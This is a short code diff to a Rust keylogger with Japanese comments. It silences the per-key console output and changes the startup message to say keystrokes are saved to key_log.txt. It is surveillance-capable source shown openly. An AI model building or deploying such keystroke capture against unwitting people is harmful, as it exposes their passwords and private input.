@@ -61,7 +61,7 @@ fn callback(event: Event) {
                 _ => format!("<{:?}>", key),
             }
         };
-        println!("{:?}", key_name);
+        // println!("{:?}", key_name);
         // キー名をグローバルバッファにスペース区切りで追加します.
         buffer.push_str(&key_name);
     }
@@ -69,7 +69,7 @@ fn callback(event: Event) {
 
 fn main() {
     // キーロガーが開始されたことをユーザーに通知します.
-    println!("キーロガーを開始します。キーを押すとキーコードが表示されます...");
+    println!("キーロガーを開始します。内容は key_log.txt に保存されます。");
 
     // 1分ごとにバッファの内容をテキストファイルに追記するスレッドを生成します.
     thread::spawn(|| {
